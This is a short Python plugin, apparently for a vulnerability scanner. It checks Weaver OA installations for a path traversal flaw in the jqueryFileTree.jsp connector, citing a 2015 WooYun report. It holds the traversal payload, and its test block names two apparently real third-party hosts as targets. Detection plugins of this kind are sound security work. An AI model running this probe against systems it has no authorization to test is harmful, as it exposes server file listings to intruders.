#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2015-0139376

import time

def assign(service, arg):
    if service == 'weaver_oa':
        return True, arg

def audit(arg):            
    payload = 'js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/'
    url = arg + payload 
    code, head, res, errcode, _ = curl.curl2(url)
    if code == 200 and 'favicon.ico' in res :
        security_warning(url + '   :Path Traversal')
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('weaver_oa','http://oa.scjnh.com:9000/')[1])
    audit(assign('weaver_oa','http://oaf.yitoa.com:6688/')[1])